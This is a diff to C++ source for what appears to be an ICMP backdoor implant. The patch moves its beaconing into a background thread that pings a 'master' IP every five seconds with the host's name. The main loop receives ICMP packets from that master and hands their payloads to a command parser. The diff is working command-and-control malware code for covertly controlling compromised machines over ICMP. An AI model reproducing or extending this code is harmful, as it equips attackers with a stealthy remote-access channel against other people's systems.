@@ -4,6 +4,7 @@
 #include <string>
 #include <vector>
 #include <sstream>
+#include <thread>
 
 #include <unistd.h>
 #include <sys/types.h>
@@ -14,8 +15,6 @@
 #include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include <arpa/inet.h>
-
-static char hostname[256];
 
 static uint16_t checksum(void *vdata, size_t size)
 {
@@ -117,6 +116,28 @@ long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
   }
 
   return ret - sizeof(ip) - sizeof(icmphdr) - 4;
+}
+
+void beacon_task(const std::string &dst, const std::string &opt)
+{
+  // Create the raw socket.
+  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
+  if (sockfd == -1) {
+    perror("socket");
+    exit(-1);
+  }
+
+  char hostname[256];
+  gethostname(hostname, sizeof(hostname));
+
+  setsockopt(sockfd, SOL_SOCKET, IP_RECVIF, opt.c_str(), opt.size());
+
+  while (1) {
+    std::string beacon = "(beacon) ";
+    beacon.append(hostname);
+    send_ping(sockfd, dst, (uint8_t *)beacon.c_str(), beacon.size() + 1);
+    usleep(5000000);
+  }
 }
 
 std::vector<std::string> split_input(std::string &input)
@@ -227,11 +248,15 @@ int main(int argc, char **argv)
     usage(0);
   }
 
-  gethostname(hostname, sizeof(hostname));
-
   // Master IP address that box will continuously ping.
   char *opt = argv[1];
   char *dest_ip = argv[2];
+
+  const size_t len = strnlen(opt, IFNAMSIZ);
+  if (len == IFNAMSIZ) {
+    std::fputs("Too long iface name", stderr);
+    exit(-1);
+  }
 
   // Create the raw socket.
   int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
@@ -240,29 +265,20 @@ int main(int argc, char **argv)
     return -1;
   }
 
-  const size_t len = strnlen(opt, IFNAMSIZ);
-  if (len == IFNAMSIZ) {
-    std::fputs("Too long iface name", stderr);
-    exit(-1);
-  }
-
   setsockopt(sockfd, SOL_SOCKET, IP_RECVIF, opt, len);
+
+  std::puts("Starting beacon thread.");
+  std::thread beacon_thread(beacon_task, dest_ip, opt);
+  beacon_thread.detach();
 
   // Start the listener loop.
   while (1) {
-    // Send a ICMP echo request.
-    std::string beacon = "(beacon) ";
-    beacon.append(hostname);
-    send_ping(sockfd, dest_ip, (uint8_t *)beacon.c_str(), beacon.size() + 1);
-
     uint8_t buf[1024];
     std::string src_ip;
     long nbytes = receive_ping(sockfd, src_ip, buf, sizeof(buf));
     if (src_ip == dest_ip) {
       parse_command(sockfd, dest_ip, buf, nbytes);
     }
-
-    usleep(100000);
   }
 
   return 0;
